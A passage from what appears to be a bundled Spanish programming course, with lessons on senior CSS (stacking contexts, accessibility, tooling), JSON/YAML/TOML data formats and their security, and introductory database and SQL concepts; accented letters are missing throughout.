`,completed:!1},{id:"css-senior-css-escalabilidad",title:"CSS a Gran Escala y Tooling",level:"senior",content:`# Leccin 23: CSS a Gran Escala y Tooling



## 1. PostCSS y Preprocesadores



SASS sigue vivo, pero el CSS moderno mata muchas de sus funciones.

Hoy reina **PostCSS**: Una herramienta que procesa tu CSS con plugins JS.

*   **Autoprefixer:** Agrega \`-webkit-\`, \`-moz-\` automticamente.

*   **CSS Nano:** Minifica el CSS.

*   **Preset Env:** Te permite usar CSS del futuro hoy (polyfill).



## 2. Linter (Stylelint)



No dejes que el equipo cometa errores. Stylelint es el ESLint del CSS.

Reglas comunes senior:

*   Prohibir IDs en selectores.

*   Limitar profundidad de anidamiento.

*   Enforzar orden de propiedades (Alphabetical o SMACSS).

*   Prohibir colores "hardcodeados" (obligar a usar variables).



## 3. Metodologas de Scoping en JS Frameworks



Cuando usas React/Vue/Angular, el CSS global es peligroso.



*   **CSS Modules:** \`import styles from './Button.module.css'\`.

    El build transforma \`.btn\` a \`.Button_btn__1x9z\`. Cero colisiones.

*   **Scoped (Vue):** \`<style scoped>\`. Agrega atributos \`data-v-xxxx\` a los elementos.

*   **CSS-in-JS (Emotion/Styled-components):** Escribes CSS en strings de JS. Potente para cambiar estilos basados en props del componente, pero aade peso de JS.



## 4. Critical CSS



Para optimizar el **First Contentful Paint (FCP)**.

Tcnica:

1.  Extraer el CSS necesario SOLO para lo que se ve en la pantalla inicial (Above the fold).

2.  Incrustarlo (Inline) en el \`<head>\` del HTML.

3.  Cargar el resto del CSS (\`styles.css\`) de forma diferida (\`preload\` o al final del body).



Esto hace que la web cargue instantneamente visualmente, aunque falte cargar el resto.

`,completed:!1},{id:"css-senior-errores-produccion-css",title:"Errores de Produccin y Debugging",level:"senior",content:`# Leccin 24: Errores de Produccin y Debugging



## 1. Stacking Contexts (El misterio del Z-Index)



*"Le puse z-index: 999999 y sigue quedando atrs"*.

El problema no es el nmero. El problema es el **Stacking Context**.



Un elemento crea un nuevo contexto de apilamiento si tiene:

*   \`opacity\` distinto de 1.

*   \`transform\` distinto de none.

*   \`filter\`, \`perspective\`, \`clip-path\`...

*   \`z-index\` distinto de auto (si es posicionado).



**Regla:** Un hijo NUNCA puede estar por encima del padre si el padre tiene un z-index bajo respecto a sus propios hermanos. El \`z-index\` es relativo al contexto local, no global.

**Solucin Senior:** Mueve el elemento conflictivo al raz del DOM (Portal) o elimina la propiedad que crea el contexto en el padre.



## 2. Overflow y Scroll Fantasma



Aparece una barra de scroll horizontal en mvil.

**Debugging:**

1.  Abre consola.

2.  Ejecuta:

    \`\`\`js

    [].forEach.call(document.querySelectorAll('*'), function(a){ a.style.outline="1px solid #"+(~~(Math.random()*(1<<24))).toString(16) })

    \`\`\`

    Esto pone bordes de colores a TODO. Vers qu caja se sale del ancho.



## 3. Ghost Space en Imgenes



Las imgenes dentro de un \`div\` a veces dejan un espacio en blanco de 3-4px abajo.

**Causa:** Las imgenes son \`inline\` por defecto, se alinean como texto (baseline), dejando espacio para las letras descendentes (j, g, y).

**Solucin Senior:** \`img { display: block; }\` o \`vertical-align: bottom\`.



## 4. Colapso de Mrgenes (Revisitado)



Si un contenedor hijo tiene margin-top, a veces ese margen se "escapa" y empuja al padre hacia abajo.

**Solucin:** \`overflow: hidden\` o \`padding: 1px\` en el padre (rompe el colapso).



## 5. Especificidad War en Libreras UI (Bootstrap/MUI)



No uses \`!important\`.

Aumenta tu especificidad repitiendo la clase:

\`.mi-clase.mi-clase { ... }\` (Doble clase = ms puntos).

O usa capas de cascada: \`@layer\`.

`,completed:!1},{id:"css-senior-accesibilidad-css",title:"CSS y Accesibilidad (A11y)",level:"senior",content:`# Leccin 25: CSS y Accesibilidad (A11y)



## 1. CSS no es solo visual, es funcional



Un mal CSS puede hacer un sitio inutilizable para personas que usan teclado o lectores de pantalla.



## 2. \`outline: none\` es CRIMEN



Muchos quitan el borde azul de foco porque "es feo".

\`\`\`css

/* NUNCA HAGAS ESTO sin dar una alternativa */

*:focus { outline: none; }

\`\`\`

Si lo haces, un usuario de teclado no sabr dnde est.

**Solucin:** Usa \`:focus-visible\`. Solo muestra el outline si se usa teclado, no mouse.



\`\`\`css

:focus:not(:focus-visible) { outline: none; }

:focus-visible { outline: 2px solid blue; }

\`\`\`



## 3. Ocultando contenido correctamente



*   **\`display: none\` / \`visibility: hidden\`**: Oculta para TODOS (ojos y lectores de pantalla).

*   **\`opacity: 0\`**: Oculta visualmente, pero sigue ah y es clickeable/enfocable.



**Cmo ocultar algo visualmente pero que el lector de pantalla lo lea?** (Ej: Labels de conos).

Usa una clase utilitaria \`.sr-only\` (Screen Reader Only):



\`\`\`css

.sr-only {

    position: absolute;

    width: 1px;

    height: 1px;

    padding: 0;

    margin: -1px;

    overflow: hidden;

    clip: rect(0, 0, 0, 0);

    white-space: nowrap;

    border: 0;

}

\`\`\`



## 4. Orden visual (\`order\` en Flex/Grid)



\`flex-direction: row-reverse\` o \`order: 1\` cambian cmo se ven las cosas, pero NO cambian el orden en el DOM.

El lector de pantalla lee el DOM. Si cambias mucho el orden visual, la experiencia de navegacin con teclado ser catica y saltarina.

**Consejo Senior:** Mantn el orden del DOM lgico y visual sincronizados tanto como sea posible.



## 5. Media Queries de Preferencia



Respeta al usuario.



*   \`@media (prefers-reduced-motion: reduce)\`:

    Desactiva animaciones bruscas para evitar mareos (vestibular disorders).

    \`\`\`css

    @media (prefers-reduced-motion: reduce) {

        * { animation: none !important; transition: none !important; }

    }

    \`\`\`



*   \`@media (prefers-color-scheme: dark)\`: Modo oscuro del sistema.

*   \`@media (prefers-contrast: high)\`: Aumenta contrastes.

`,completed:!1},{id:"css-senior-ejercicios-senior",title:"Ejercicios Tcnicos Senior",level:"senior",content:`# Leccin 26: Ejercicios Tcnicos Senior



## 1. Arquitectura de Botones (Design System)



Crea un sistema de botones escalable usando BEM y Custom Properties.

Requisitos:

*   Variantes: \`primary\`, \`secondary\`, \`ghost\`.

*   Tamaos: \`sm\`, \`md\`, \`lg\`.

*   Un botn con estado \`loading\` que muestre un spinner sin alterar el ancho/alto del botn.

*   Debe soportar temas (Dark/Light).

*   Cdigo ultra-DRY (Don't Repeat Yourself).



## 2. Debugging de Stacking Context



Crea un modal (\`z-index: 100\`) dentro de un contenedor que tenga \`transform: scale(0.9)\`.

Observa cmo el modal queda "atrapado" visualmente o cortado, o el backdrop no cubre toda la pantalla.

Explica por qu pasa y propn la solucin usando React Portals o estrategias CSS.



## 3. Layout "Imposible"



Crea un Grid que:

*   Tenga columnas automticas (\`auto-fit\`).

*   Las tarjetas tengan un ancho mnimo de 300px.

*   Si hay 3 o menos, se centren en el medio de la pantalla.

*   Si hay ms, ocupen todo el ancho alinadas a la izquierda.

*   Todo sin Media Queries (usa solo Grid y alineaciones).



## 4. Refactorizacin de Legado



Toma un CSS hipottico lleno de IDs y selectores anidados (\`#main .content div ul li a\`).

Escribe un plan de refactorizacin para migrarlo a BEM/ITCSS sin romper la produccin visualmente en el proceso. (Pista: Mapeo de clases, herramientas de regresin visual).



## 5. Auditora de Performance



Si una animacin de men a 60fps est causando que la CPU de tu laptop suba al 100%, qu propiedades CSS ests animando probablemente? Cmo lo arreglas para usar la GPU?

Respuesta esperada: Ests animando \`left/top/margin\`. Cmbialo a \`transform: translate()\`.

`,completed:!1},{id:"css-eval-senior",title:"Evaluacin Final: Nivel Senior",level:"senior",content:`# Evaluacin de Competencias: CSS Senior



Esta evaluacin mide tu capacidad para escalar CSS, optimizar rendimiento y garantizar accesibilidad y mantenibilidad.



## Seccin 1: Arquitectura y Performance



1.  **Describe cmo organizaras el CSS de una aplicacin bancaria grande con 5 equipos trabajando en ella. Qu metodologas o herramientas usaras?**

2.  **Qu es el "Layout Thrashing" y cmo lo evitas? Da un ejemplo de cdigo JS/CSS que lo provoque.**

3.  **Explica cmo funciona el Stacking Context y cmo solucionaras un modal que aparece detrs de un banner.**

4.  **Cmo implementas un "Dark Mode" escalable sin duplicar todo tu CSS?**

5.  **Por qu \`display: none\` es problemtico para animaciones y accesibilidad en ciertos casos?**



## Seccin 2: Desafo de Sistema de Diseo



Crea (en cdigo o pseudocdigo detallado) la estructura CSS para un componente **Botn** escalable usando **Custom Properties**.

Debe soportar:

*   Variantes: \`primary\`, \`secondary\`, \`outline\`.

*   Tamaos: \`small\`, \`medium\`, \`large\`.

*   Un estado \`disabled\` que sea accesible.

*   Debe ser fcil cambiar el "Color Primario" de toda la app y que los botones se actualicen.



## Seccin 3: Auditora y Refactoring



Audita el siguiente CSS (hipottico) y lista 3 cosas que refactorizaras "a la manera Senior":



\`\`\`css

#header div.menu ul li a {

    font-size: 16px;

    color: #333;

}

.btn-rojo {

    background: red !important;

    width: 200px;

    margin-left: 20px;

}

/* Media query escritorio */

@media (max-width: 1200px) { ... }

\`\`\`



## Criterios de Aprobacin



*   [ ] Enfoque en escalabilidad (Variables, BEM/ITCSS, Tokens).

*   [ ] Conocimiento profundo de rendering del navegador (Reflow/Repaint).

*   [ ] Soluciones accesibles y semnticas.

*   [ ] Capacidad de refactorizar cdigo legacy sin romper la UI.

`,completed:!1,isProject:!0}]},ev={id:"data-formats",title:"Formatos de Datos (JSON, YAML, TOML)",description:"Domina los estndares industriales para el intercambio de datos y la configuracin de aplicaciones modernas.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"data-formats-01-intro-json",title:"JSON - El Estndar de la Web",level:"junior",content:`# Leccin 01: JSON - El Estndar de la Web

**JSON** (JavaScript Object Notation) es el formato de intercambio de datos ms popular del mundo. Aunque naci de JavaScript, hoy se usa en casi todos los lenguajes.

## 1. Caractersticas Principales
*   **Basado en Texto:** Es fcil de leer para humanos y mquinas.
*   **Estructura de Clave-Valor:** Los datos se organizan en pares \`"nombre": "valor"\`.
*   **Tipos de datos soportados:** Strings, Nmeros, Booleanos, Arrays, Objetos y \`null\`.

## 2. Reglas de Oro en JSON
1.  **Comillas dobles obligatorias:** Las claves y los strings DEBEN usar \`"\`, nunca \`'\`.
2.  **Sin funciones ni comentarios:** JSON solo transporta datos. No puedes poner lgica ni notas.
3.  **Sin coma final:** El ltimo elemento de un objeto o lista NO debe llevar coma.

## 3. Ejemplo Bsico
\`\`\`json
{
  "usuario": "Pepito",
  "edad": 30,
  "esAdmin": true,
  "lenguajes": ["JS", "TS", "Bash"]
}
\`\`\`

---

### Concepto Junior:
JSON es como la "lengua franca" de internet. Si tu Frontend quiere hablar con tu Backend, lo ms probable es que se pasen papelitos escritos en formato JSON.
`,completed:!1},{id:"data-formats-02-intro-yaml",title:"YAML - Formato para Humanos",level:"junior",content:`# Leccin 02: YAML - Formato para Humanos

**YAML** (YAML Ain't Markup Language) es un formato diseado para ser extremadamente legible. Es el estndar para archivos de configuracin en herramientas como Docker, Kubernetes o GitHub Actions.

## 1. Caractersticas Principales
*   **Basado en Indentacin:** Usa espacios para jerarquizar los datos (como Python). No usa llaves \`{}\` ni corchetes \`[]\`.
*   **Soporta Comentarios:** A diferencia de JSON, puedes poner notas usando \`#\`.
*   **Menos "Ruido":** No necesitas tantas comillas ni comas.

## 2. El peligro de los espacios
En YAML, un espacio de ms o de menos rompe todo el archivo. Es muy estricto con la alineacin.

## 3. Ejemplo Bsico
\`\`\`yaml
# Configuracin del servidor
servidor:
  puerto: 8080
  entorno: produccion
  logs:
    - acceso.log
    - errores.log
\`\`\`

---

### Concepto Junior:
Usa YAML cuando quieras que un humano lea y escriba una configuracin fcilmente. Pero ten cuidado: los espacios invisibles son tus enemigos!
`,completed:!1},{id:"data-formats-03-intro-toml",title:"TOML - Configuracin sin Obviedades",level:"junior",content:`# Leccin 03: TOML - Configuracin sin Obviedades

**TOML** (Tom's Obvious Minimal Language) es un formato que busca ser mnimo y obvio. Es muy popular en ecosistemas como Rust y herramientas de JavaScript modernas (como el \`pyproject.toml\` en Python o configuraciones de frameworks).

## 1. Caractersticas Principales
*   **Parece un archivo .ini:** Usa secciones entre corchetes \`[seccion]\`.
*   **Fuertemente tipado:** Maneja fechas, horas y nmeros de forma muy clara.
*   **Plano:** A diferencia de YAML, no depende de la indentacin, lo que lo hace menos propenso a errores humanos "invisibles".

## 2. Ejemplo Bsico
\`\`\`toml
title = "Configuracin de Progravio"

[database]
server = "192.168.1.1"
ports = [ 8000, 8001, 8002 ]
connection_max = 5000
enabled = true
\`\`\`

---

### Concepto Junior:
TOML es genial para archivos de configuracin que no tienen una jerarqua muy profunda. Es ms robusto que YAML (porque no depende de espacios) y ms legible que JSON (porque permite comentarios y no tiene tantas comillas).
`,completed:!1},{id:"data-formats-04-comparativa",title:"Comparativa y Cundo usar cada uno?",level:"junior",content:`# Leccin 04: Comparativa y Cundo usar cada uno?

No hay un formato mejor que otro, sino uno ms adecuado para cada tarea.

## 1. La Gran Comparativa

| Formato | Comentarios | Jerarqua | Uso Principal |
| :--- | :--- | :--- | :--- |
| **JSON** | No | Llaves \`{}\` | Comunicacin entre APIs |
| **YAML** | S | Indentacin | Configuracin (Docker/K8s) |
| **TOML** | S | Secciones \`[]\` | Configuracin de Proyectos/Herramientas |

## 2. Casos de Uso
*   **Si vas a enviar datos desde un servidor a una App mvil:** Usa **JSON**. Es el ms ligero y compatible.
*   **Si vas a configurar un despliegue complejo con muchas opciones anidadas:** Usa **YAML**. Es visualmente ms limpio.
*   **Si vas a configurar los metadatos de tu librera o proyecto:** Usa **TOML**. Es difcil de romper y muy claro.

---

### Misin Junior:
Aprender a distinguir a simple vista si un archivo est en JSON (busca llaves), YAML (busca guiones e indentacin) o TOML (busca secciones con corchetes).
`,completed:!1},{id:"data-formats-05-configuracion",title:"Configuracin de Aplicaciones y Serializacin",level:"semi-senior",content:"# Leccin 05: Configuracin de Aplicaciones y Serializacin\n\nComo Semi-Senior, debes saber cmo transformar estos formatos en objetos de tu lenguaje (JavaScript/TypeScript) y viceversa.\n\n## 1. Serializacin y Deserializacin\n*   **Serializar:** Convertir un objeto en memoria a un formato de texto (ej: `JSON.stringify(objeto)`).\n*   **Deserializar (Parsear):** Convertir texto a un objeto en memoria (ej: `JSON.parse(texto)`).\n\n## 2. Manejo de archivos de configuracin\nEn Node.js, solemos leer archivos `.json` directamente con `require` o archivos `.yaml`/`.toml` usando libreras externas.\n*   **YAML en JS:** Usamos `yaml` o `js-yaml`.\n*   **TOML en JS:** Usamos `@iarna/toml` o `toml`.\n\n## 3. Entornos dinmicos\nNunca guardes contraseas reales en estos archivos si van a subirse a Git. Usa marcadores de posicin o variables de entorno que luego se inyecten.\n\n---\n\n### Lo que hace un Semi-Senior:\nNo asume que el archivo de configuracin est bien escrito. Siempre usa un bloque `try/catch` al parsear, porque un error en un solo carcter puede hacer que toda la aplicacin se detenga al arrancar.\n",completed:!1},{id:"data-formats-06-validacion",title:"Validacin y JSON Schema",level:"semi-senior",content:`# Leccin 06: Validacin y JSON Schema

Recibir datos en formato JSON es fcil, pero asegurar que tengan la estructura correcta es difcil. Para eso usamos esquemas.

## 1. JSON Schema
Es un estndar para declarar qu campos debe tener un JSON, de qu tipo son y si son obligatorios.
*   **Beneficio:** Autodocumentacin y validacin automtica.

## 2. Herramientas de Validacin (Zod, Ajv)
En el mundo de TypeScript, herramientas como **Zod** permiten definir el esquema y validar los datos al mismo tiempo.
\`\`\`typescript
import { z } from 'zod';

const UsuarioSchema = z.object({
  id: z.number(),
  email: z.string().email(),
  tags: z.array(z.string()).optional()
});

// Si los datos no cumplen, lanza un error descriptivo
const datosValidados = UsuarioSchema.parse(datosRecibidos);
\`\`\`

## 3. Por qu validar en el Edge
Validar los datos apenas entran a tu sistema evita que errores de tipo ("esto deba ser un nmero y es un string") causen bugs extraos en la profundidad de tu cdigo.

---

### Misin Semi-Senior:
Nunca confes en los datos externos. Valida siempre la estructura de tus archivos JSON/YAML antes de usarlos en tu lgica de negocio.
`,completed:!1},{id:"data-formats-07-buenas-practicas",title:"Buenas Prcticas en Formatos de Datos",level:"semi-senior",content:`# Leccin 07: Buenas Prcticas en Formatos de Datos

Escribir archivos de datos limpios es tan importante como escribir cdigo limpio.

## 1. Nomenclatura consistente
Decide si usars \`snake_case\` o \`camelCase\` para tus claves y mantn la decisin en todo el proyecto.
*   En JSON/JS se prefiere \`camelCase\`.
*   En YAML/Configuraciones de sistema se prefiere \`snake_case\`.

## 2. Evita la anidacin excesiva
Si tu archivo de configuracin tiene 10 niveles de profundidad, es muy difcil de leer y mantener. Intenta aplanar la estructura.

## 3. Usa el formato adecuado para el tamao
*   Si tienes millones de registros: Tal vez un formato de texto plano como JSON no sea el adecuado y necesites formatos binarios (como Protocol Buffers o Avro).
*   Si son 10 opciones de configuracin: YAML es perfecto.

## 4. Comentarios tiles
En YAML y TOML, usa comentarios para explicar **por qu** se eligi un valor, no qu hace el valor (si el nombre de la clave es bueno, se debera entender).

---

### Verdad de Datos:
Un archivo de configuracin es la interfaz entre el sistema y el humano que lo opera. Hazlo amigable.
`,completed:!1,isProject:!0},{id:"data-formats-08-practica-formatos",title:"Prctica y Evaluacin: Formatos de Datos",level:"semi-senior",content:`# Prctica y Evaluacin: Formatos de Datos

Demuestra que sabes elegir y manipular la informacin correctamente.

---

## 1. Ejercicio Junior: El Traductor
**Consigna:** Tienes este objeto en JSON. Escrbelo en formato YAML manteniendo la misma informacin.
\`\`\`json
{
  "project": "Progravio",
  "version": 1.0,
  "active": true,
  "tags": ["edu", "tech"]
}
\`\`\`

## 2. Ejercicio Semi-Senior: El Arquitecto de Config
**Escenario:** Ests diseando un sistema de despliegue. Quieres que el usuario pueda definir: el nombre del servidor, una lista de puertos permitidos y una opcin para habilitar SSL.
*Consigna:* Escribe cmo se vera este archivo en **TOML**.

## 3. Evaluacin de Conceptos
*   Por qu no es buena idea usar JSON para un archivo de configuracin que un humano debe editar frecuentemente?
*   Qu es la "Serializacin"?
*   Cul es la principal ventaja de YAML sobre JSON en trminos de documentacin interna?

---

### Resultado esperado:
Comprensin de las debilidades y fortalezas de cada formato para tomar decisiones tcnicas acertadas. 
`,completed:!1,isProject:!0},{id:"data-formats-09-infraestructura-produccion",title:"Formatos de Datos en Infraestructura y Produccin",level:"senior",content:`# Leccin 09: Formatos de Datos en Infraestructura y Produccin

En el nivel Senior, los formatos de datos ya no son solo archivos de texto, sino piezas crticas que definen cmo se despliega y escala un sistema.

## 1. Configuracin de Infraestructura como Cdigo (IaC)
Herramientas como **Terraform** (HCL, similar a TOML) o **CloudFormation** (YAML/JSON) definen nubes enteras usando estos formatos.
*   **YAML es el Rey:** Es el estndar de facto para Kubernetes. Un error de indentacin en un YAML de Kubernetes puede dejar a millones de usuarios sin servicio.

## 2. Inyeccin de Secretos en Produccin
Nunca guardes secretos (claves de API, contraseas de DB) en tus archivos JSON o YAML.
*   **Estrategia Senior:** Usa archivos de configuracin para la estructura y marcadores de posicin (\`\${DB_PASSWORD}\`) para los valores sensibles, los cuales se inyectan en tiempo de ejecucin desde un Vault (como HashiCorp Vault o AWS Secrets Manager).

## 3. Optimizacin de Carga
Para sistemas de alta performance, el parseo de JSON puede ser un cuello de botella.
*   **JSON Streaming:** Si recibes un archivo JSON de 2GB, no puedes usar \`JSON.parse()\`. Debes usar libreras de streaming (como \`stream-json\`) para procesar el archivo pieza por pieza sin saturar la RAM.

---

### Visin Senior:
"La mejor configuracin es la que es inmutable en produccin pero flexible a travs de variables de entorno".
`,completed:!1},{id:"data-formats-10-seguridad-datos",title:"Seguridad en el Manejo de Datos",level:"senior",content:`# Leccin 10: Seguridad en el Manejo de Datos

Manejar formatos de datos externos abre la puerta a ataques sofisticados si no se hace con cuidado.

## 1. YAML Bomb (Billion Laughs Attack)
YAML permite definir "entidades" que pueden referenciarse a s mismas. Un atacante puede enviar un archivo de 1KB que, al expandirse en memoria, ocupa 4GB, congelando tu servidor.
*   **Solucin:** Usa siempre parsers que limiten la profundidad de anidacin y desactiven las entidades personalizadas.

## 2. Inyeccin en JSON
Aunque JSON es solo datos, si esos datos se concatenan directamente en consultas SQL o comandos de sistema sin validar, se convierten en vectores de inyeccin.
*   **Regla de Oro:** Trata a todo JSON recibido como veneno hasta que pase por una validacin de esquema robusta (como Zod).

## 3. Exposicin de Metadatos
Muchos formatos (especialmente el formato XML viejo o YAML complejo) pueden incluir informacin sobre la estructura interna del servidor o rutas de archivos. Asegrate de limpiar los errores de parseo antes de enviarlos al cliente para no revelar informacin sensible.

---

### Misin Senior:
Tu trabajo es construir un "muro de contencin" entre los archivos de datos que recibes y el corazn de tu aplicacin. La seguridad empieza en el formato.
`,completed:!1}]},Fx={id:"db",title:"Bases de Datos",description:"Aprende a almacenar y gestionar informacin de forma eficiente usando SQL y NoSQL.",completed:!1,lessons:[{id:"db-junior-que-es-db",title:"Qu es una base de datos?",level:"junior",content:`# Leccin 1: Qu es una base de datos?

Imagina que tienes una tienda online. Empiezas anotando tus ventas en un cuaderno. Luego, pasas a un archivo de Excel. Pero cuando tienes miles de clientes y cientos de pedidos al da, el Excel se vuelve lento, difcil de compartir y propenso a errores (alguien borra una celda por accidente).

Aqu es donde entra una **Base de Datos (DB)**.

## 1. Definicin Simple
Una base de datos es un sistema organizado para **almacenar, gestionar y recuperar informacin** de manera eficiente y segura. 

A diferencia de un archivo de texto o un Excel, una base de datos:
*   Puede manejar millones de datos sin despeinarse.
*   Permite que muchas personas o aplicaciones accedan a la vez.
*   Tiene reglas para que los datos no se corrompan (ej: no puedes tener un pedido sin un cliente).

## 2. El Sistema de Gestin (DBMS)
No interactas con los datos directamente (como si fuera un archivo de Word). Usas un software llamado **DBMS** (Database Management System). Es el "traductor" entre t y la montaa de datos.

Ejemplos famosos:
*   **MySQL / PostgreSQL:** Muy comunes en webs.
*   **MongoDB:** Muy comn en apps de JavaScript.
*   **Oracle:** Usado por bancos gigantes.

## 3. Por qu el Frontend necesita saber de esto?
Aunque como desarrollador Frontend no suelas configurar el servidor de la base de datos, los datos que muestras en tu React/Vue/Angular vienen de ah. Entender cmo estn organizados te ayudar a pedir la informacin de forma ms inteligente y a entenderte mejor con el equipo de Backend.

---

## Mini Ejercicio
Piensa en una aplicacin que uses a diario (como Instagram). Qu tipo de informacin crees que guardan en su base de datos? Haz una lista de al menos 5 cosas (ej: nombre de usuario, fecha de la foto...).
`,completed:!1},{id:"db-junior-datos-estructurados",title:"Datos Estructurados vs No Estructurados",level:"junior",content:`# Leccin 2: Datos Estructurados vs No Estructurados

No todos los datos son iguales. Dependiendo de qu estemos guardando, elegiremos un formato u otro.

## 1. Datos Estructurados (SQL)
Son datos que tienen un formato rgido y predefinido. Es como un formulario donde cada campo tiene su lugar.
*   **Ejemplo:** Informacin de un banco (DNI, Nombre, Saldo).
*   **Ventaja:** Son muy fciles de buscar y analizar.
*   **Modelo mental:** Un armario con cajones etiquetados: "Aqu solo van calcetines", "Aqu solo camisas".

## 2. Datos No Estructurados (NoSQL)
Son datos que no tienen un formato fijo. Pueden ser textos largos, imgenes, videos o simples notas que varan de un usuario a otro.
*   **Ejemplo:** El contenido de un email, un post de redes sociales con diferentes tipos de media, o una estructura JSON que cambia segn el contexto.
*   **Ventaja:** Gran flexibilidad. Puedes guardar lo que quieras sin avisar antes al sistema.
*   **Modelo mental:** Una caja grande donde vas echando cosas: "Ya luego ver cmo lo organizo".

## 3. Datos Semi-estructurados
Es un punto medio. Tienen cierta organizacin pero no son tan rgidos como una tabla. El ejemplo ms claro es el **JSON** que usas en JavaScript o el **XML**.

## Comparativa Rpida
| Caracterstica | Estructurados (SQL) | No Estructurados (NoSQL) |
| :--- | :--- | :--- |
| **Formato** | Rgido (Tablas) | Flexible (Documentos, Grafos) |
| **Escalabilidad** | Vertical (Potencia) | Horizontal (Ms mquinas) |
| **Uso Ideal** | Transacciones seguras | Big Data, Apps rpidas |

---

## Mini Ejercicio
Si fueras a crear una aplicacin para una Biblioteca, qu datos crees que seran Estructurados (ej: ISBN del libro) y qu datos podran ser No Estructurados?
`,completed:!1},{id:"db-junior-sql-vs-nosql",title:"SQL vs NoSQL (La Gran Divisin)",level:"junior",content:`# Leccin 3: SQL vs NoSQL (La Gran Divisin)

Esta es la pregunta clsica. Qu base de datos elijo? Todo depende de las necesidades de tu proyecto.

## 1. SQL (Relacionales)
SQL significa *Structured Query Language*. Son las bases de datos "de toda la vida" (aunque siguen siendo las ms usadas).
*   **Basadas en Tablas:** Todo se organiza en filas y columnas.
*   **Esquema Rgido:** Antes de guardar nada, tienes que definir qu vas a guardar (el "Plano").
*   **Relaciones:** Son excelentes conectando datos de diferentes tablas (ej: Conectar un \`Pedido\` con un \`Cliente\`).
*   **Ejemplos:** MySQL, PostgreSQL, SQLite, SQL Server.

## 2. NoSQL (No Relacionales)
Surgen para manejar grandes volmenes de datos y cambios rpidos. No usan tablas (normalmente).
*   **Tipos:** Documentos (como JSON), Clave-Valor (como Redis), Grafos o Columnar.
*   **Esquema Flexible:** Puedes guardar un usuario con 2 campos y otro con 20 en la misma coleccin.
*   **Escalabilidad:** Muy fciles de repartir en muchos servidores.
*   **Ejemplos:** MongoDB (Documentos), Redis (Clave-Valor), Cassandra.

## 3. Cundo usar cada una?

### Usa SQL si:
*   Tus datos son consistentes y predecibles.
*   Necesitas transacciones complejas (como transferencias bancarias).
*   La integridad de los datos es vital (que nada se pierda ni se duplique).

### Usa NoSQL si:
*   Ests prototipando rpido y tus datos cambian mucho.
*   Manejas datos masivos o en tiempo real (Big Data).
*   Tus datos no tienen una estructura clara entre s.

---

## Mini Ejercicio
Investiga en Google qu base de datos usa **Instagram**. Es SQL o NoSQL? (Spoiler: Usan un poco de ambas para diferentes cosas!).
`,completed:!1},{id:"db-junior-tablas-registros",title:"Tablas, Registros y Campos (El ABC de SQL)",level:"junior",content:'# Leccin 4: Tablas, Registros y Campos (El ABC de SQL)\n\nEn el mundo SQL, los datos viven en **Tablas**. Es el concepto ms importante que debes dominar.\n\n## 1. La Tabla\nEs la entidad general. Por ejemplo, una tabla llamada `Usuarios`.\n\n## 2. Los Campos (Columnas)\nDefine **qu tipo** de informacin guardamos. Cada columna tiene un nombre y un tipo de dato (Texto, Nmero, Fecha).\n*   **Nombre de columna:** `email`, `edad`, `fecha_registro`.\n*   **Tipo de dato:** `VARCHAR` (texto), `INT` (entero), `DATE`.\n\n## 3. Los Registros (Filas)\nEs la informacin de un objeto concreto. Una fila es un "Usuario" real.\n*   **Fila 1:** `juan@mail.com`, `25`, `2023-01-01`.\n*   **Fila 2:** `ana@mail.com`, `30`, `2023-05-10`.\n\n## Ejemplo Visual\n| id | nombre | email | es_premium |\n| :--- | :--- | :--- | :--- |\n| 1 | Carlos | carlos@... | true |\n| 2 | Marta | marta@... | false |\n\n*   **Tabla:** Clientes.\n*   **Campo:** `nombre`.\n*   **Registro:** La fila nmero 2 completa.\n\n---\n\n## Mini Ejercicio\nDisea mentalmente una tabla para un `Videojuego`. Qu columnas (campos) le pondras? Intenta que cada campo tenga un tipo (ej: `puntuacion` -> nmero, `nombre` -> texto).\n',completed:!1},{id:"db-junior-claves-relaciones",title:"Claves Primarias y Forneas (Relaciones)",level:"junior",content:`# Leccin 5: Claves Primarias y Forneas (Relaciones)

Cmo sabe la base de datos que el Pedido #50 es de Juan y no de Pedro? Para conectar tablas usamos **Keys** (Llaves).

## 1. Primary Key (PK) - Clave Primaria
Es el identificador nico de cada registro. No puede haber dos iguales en la misma tabla.
*   Pinsalo como el **DNI** o la huella dactilar.
*   Suele llamarse simplemente \`id\`.

## 2. Foreign Key (FK) - Clave Fornea
Es una clave primaria de otra tabla que ponemos en la tabla actual para crear una relacin.
*   Es el "link" o vnculo.

## Ejemplo de Relacin:
Imagina dos tablas: \`Autores\` y \`Libros\`.

**Tabla Autores:**
| id (PK) | nombre |
| :--- | :--- |
| **1** | Stephen King |
| **2** | J.K. Rowling |

**Tabla Libros:**
| id (PK) | titulo | autor_id (FK) |
| :--- | :--- | :--- |
| 10 | It | **1** |
| 11 | Harry Potter | **2** |

En la tabla \`Libros\`, el campo \`autor_id\` es una **Clave Fornea** que apunta a la **Clave Primaria** de la tabla \`Autores\`. As sabemos quin escribi qu!

## 3. Tipos de Relaciones
*   **Uno a Muchos (1:N):** Un Autor tiene muchos Libros (el ejemplo de arriba).
*   **Muchos a Muchos (N:N):** Un Estudiante tiene muchas Materias, y una Materia tiene muchos Estudiantes.
*   **Uno a Uno (1:1):** Un Usuario tiene un solo Perfil.

---

## Mini Ejercicio
En una aplicacin de msica, cules seran las PK y FK para relacionar una tabla de \`Artistas\` con una tabla de \`Canciones\`?
`,completed:!1},{id:"db-junior-intro-sql",title:"Introduccin a SQL (Hablando con la DB)",level:"junior",content:`# Leccin 6: Introduccin a SQL (Hablando con la DB)

SQL no es un lenguaje de programacin como JavaScript; es un lenguaje de **vnculo**. T no le dices a la base de datos *cmo* hacer las cosas (con bucles), le dices *qu* quieres obtener.

## 1. Cmo se lee?
Las sentencias SQL parecen frases en ingls. Son declarativas.

## 2. La Sentencia Bsica
El 90% del tiempo estars usando el comando \`SELECT\`.

\`\`\`sql
SELECT nombre, email FROM usuarios;
\`\`\`
Esto se traduce como: *"Selecciona los campos nombre y email de la tabla usuarios"*.

## 3. Filtrando con WHERE
No siempre quieres todos los datos. Quieres filtrar.
\`\`\`sql
SELECT * FROM usuarios WHERE pais = 'Argentina';
\`\`\`
El \`*\` significa "todas las columnas".

## 4. Tipos de Comandos (Bsico)
*   **DDL (Data Definition):** Para crear la estructura (ej: \`CREATE TABLE\`). Es como construir el armario.
*   **DML (Data Manipulation):** Para mover los datos dentro (ej: \`SELECT\`, \`INSERT\`). Es como meter o sacar ropa del armario.

---

## Mini Ejercicio
Si quieres buscar a todos los usuarios mayores de 18 aos, cmo crees que terminara la frase SQL? 
\`SELECT * FROM usuarios WHERE edad ...\`
